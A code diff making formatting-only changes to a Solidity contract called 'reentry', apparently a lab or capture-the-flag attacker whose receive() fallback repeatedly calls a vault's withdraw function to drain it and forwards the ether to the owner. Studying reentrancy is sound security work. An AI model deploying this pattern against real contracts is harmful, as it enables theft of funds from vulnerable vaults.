@@ -10,7 +10,7 @@ contract reentry {
     uint256 public setAmount = 1 ether;
     bool attack = false;
 
-    constructor(address _vault) payable{
+    constructor(address _vault) payable {
         v = vault(payable(_vault));
         owner = msg.sender;
     }
@@ -26,13 +26,12 @@ contract reentry {
 
     // Fallback function to receive ether and re-enter the vault
     receive() external payable {
-        if(attack && address(v).balance >= setAmount) {
+        if (attack && address(v).balance >= setAmount) {
             v.withdraw(setAmount);
         } else {
             attack = false;
-            (bool success, )=owner.call{value:address(this).balance}("");
+            (bool success,) = owner.call{value: address(this).balance}("");
             require(success, "ya got fked");
         }
     }
-    
 }
